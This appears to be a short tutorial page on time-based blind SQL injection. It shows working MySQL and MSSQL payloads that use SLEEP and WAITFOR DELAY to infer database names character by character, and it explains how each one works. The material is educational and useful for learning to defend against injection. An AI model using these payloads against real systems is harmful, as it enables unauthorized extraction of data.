Time-based Data Extraction Payload (MySQL)
1id=1 AND IF(ASCII(SUBSTRING(database(),1,1))=97, SLEEP(5), 0)
2
3-- Explanation:
4-- IF(condition, true_value, false_value): MySQL conditional statement.
5--   If the ASCII value of the 1st char of the database name is 97 ('a'),
6--   then SLEEP(5) is executed, causing a 5-second delay.
7--   Otherwise, 0 is returned, and no delay occurs.
8-- Attackers observe the page load time to infer the condition's truth.
MSSQL Equivalent

id=1; IF (ASCII(SUBSTRING(DB_NAME(),1,1))=97) WAITFOR DELAY '00:00:05'--

Practical Application

Injecting Time Delays

Leveraging SLEEP() and WAITFOR DELAY for data inference.

Key Functions
  • SLEEP(seconds): MySQL/PostgreSQL function to pause execution.
  • WAITFOR DELAY 'HH:MM:SS': MSSQL statement for time delays.
Performance Impact

Time-based attacks are significantly slower than Boolean-based due to forced delays, requiring patience and automation.

Key Takeaway

By embedding database-specific time-delay functions within conditional queries, attackers can create a measurable signal to extract data when no other output is available.
